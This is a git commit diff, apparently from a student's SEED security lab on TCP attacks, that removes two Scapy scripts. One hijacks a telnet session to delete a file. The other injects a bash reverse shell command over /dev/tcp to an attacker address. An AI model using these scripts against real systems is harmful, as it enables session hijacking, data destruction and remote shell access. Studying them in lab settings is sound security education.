c6fedaa6e24f519dce2bb8399f1437c115f05c0a
yuyouyu <624297803@qq.com>
2022-02-19 18:27:08 +0800

    add: add Labsetup files and report5

--- 2.Attacks on the TCP Protocol/VM_Shared/Labsetup-1/volumes/HJattack.py
+++
@@ -1,8 +0,0 @@
-#!/usr/bin/env python3
-from scapy.all import *
-ip  = IP(src="10.9.0.1", dst="10.9.0.5")
-tcp = TCP(sport=54894, dport=23, flags="PA", seq=4014212077, ack=4190766443)
-data = "rm -f /home/seed/new.txt\r"
-pkt = ip/tcp/data
-ls(pkt)
-send(pkt,verbose=0)
--- 2.Attacks on the TCP Protocol/VM_Shared/Labsetup-1/volumes/RShell.py
+++
@@ -1,8 +0,0 @@
-#!/usr/bin/env python3
-from scapy.all import *
-ip  = IP(src="10.9.0.1", dst="10.9.0.5")
-tcp = TCP(sport=45184, dport=23, flags="PA", seq=278493352, ack=2193314869)
-data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
-pkt = ip/tcp/data
-ls(pkt)
-send(pkt,verbose=0)
